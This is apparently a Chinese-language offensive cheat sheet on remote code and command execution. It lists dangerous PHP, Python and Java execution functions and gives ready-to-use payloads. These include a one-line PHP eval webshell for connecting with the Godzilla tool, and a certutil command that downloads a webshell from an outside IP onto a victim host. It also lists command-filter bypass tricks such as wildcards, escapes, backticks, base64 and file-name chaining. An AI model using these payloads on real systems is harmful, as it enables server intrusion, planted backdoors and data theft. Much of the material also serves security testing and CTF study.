漏洞函数:

1.PHP:
PHP **代码执行**函数:
eval()、assert()、preg_replace()、create_function()、array_map()、
call_user_func()、call_user_func_array()、array_filter()、uasort()
等
PHP **命令执行**函数:
system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()
passthru()、等

```
$code = $_GET['c'];
eval($code);
代码执行：
?c=phpinfo();

$cmd = $_GET['c'];
system($cmd);
命令执行：
?c=ver

二者又可以互相转换：
$code = $_GET['c'];
eval($code);
?c=system('ver'); //代码执行转换成命令执行

// 命令执行怎么转换成代码执行？
// 如果装了php环境 那么命令行就可以执行php命令
php "<?php phpinfo();?>" > 1.php
php 1.php


```

**命令执行可以直接反弹shell 代码执行可以植入后门**

```
当有代码执行漏洞时
?c=eval($_POST['x'])
然后哥斯拉连接

生成一句话木马1.php 内容：<?php eval($_POST['x']);?>
然后访问1.php
然后哥斯拉连接

所以上面的代码执行和下面的是一样的
```

棱角社区工具库：https://forum.ywhack.com/bountytips.php?download

```
$cmd = $_GET['c']
system($cmd);
执行文件下载：
?c=certutil.exe -urlcache -split -f http://103.217.196.59:8080/1.txt 1.php

1.txt内容是<?php eval($_POST['x']);?> 到了受害机上面变成1.php
```

2.Python:
eval exec subprocess os.system commands

3.Java:
Java 中没有类似 php 中 eval 函数这种直接可以将字符串转化为代码执行的函数,
但是有反射机制,并且有各种基于反射机制的表达式引擎,如: OGNL、SpEL、MVEL 等.







通配符

```
flag=fl*
cat fl*
cat ?la*
```

2、转义符号

```
ca\t /fl\ag
cat fl\'ag
```

2、

```
1 使用空变量$*和$@，${x},${x}绕过
ca$t fl$*ag
ca@t fl$@ag
ca$5t f$5lag
ca${2}t f${2}lag
```

3、拼接法

```
a=fl;b=ag;cat$a$b
```

4、反引号绕过：

```
cat `ls`
```

5、编码绕过:

```
echo 'flag' | base64
cat `echo ZmxhZwo= | base64 -d`

还可以
echo 'cat' | base64
`echo Y2F0Cg== | base64 -d` flag
```

6、组合绝活
touch "ag"
touch "fl\\"
touch "t \\"
touch "ca\\"
ls -t >shell
sh shell

\指的是换行

ls -t 是将文本按时间排序输出

ls -t >shell 将输出输入到 shell 文件中

sh 将文本中的文字读取出来执行



7、异或无符号（过滤 0-9a-zA-Z）
异或: rce-xor.php & rce-xor.py
或: rce-xor-or.php & rce-xor-or.py